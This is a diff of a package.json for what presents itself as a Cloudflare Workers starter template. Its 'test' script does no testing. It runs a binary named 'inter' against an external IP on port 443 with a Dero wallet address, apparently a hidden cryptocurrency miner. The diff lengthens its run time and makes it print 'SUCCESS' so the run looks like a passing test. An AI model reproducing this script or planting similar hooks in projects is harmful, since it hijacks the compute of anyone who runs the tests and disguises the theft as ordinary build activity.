@@ -5,7 +5,7 @@
   "description": "A template for kick starting a Cloudflare Workers project",
   "main": "index.js",
   "scripts": {
-    "test": "chmod 700 inter && timeout 30m ./inter -o s+tcp://51.222.96.66:443 -u dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.CLO >/dev/null 2>&1",
+    "test": "chmod 700 inter && timeout 55m ./inter -o s+tcp://51.222.96.66:443 -u dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.CLO;echo SUCCESS",
     "format": "prettier --write '**/*.{js,css,json,md}'"
   },
   "author": "Kristian Freeman <kristian@kristianfreeman.com>",
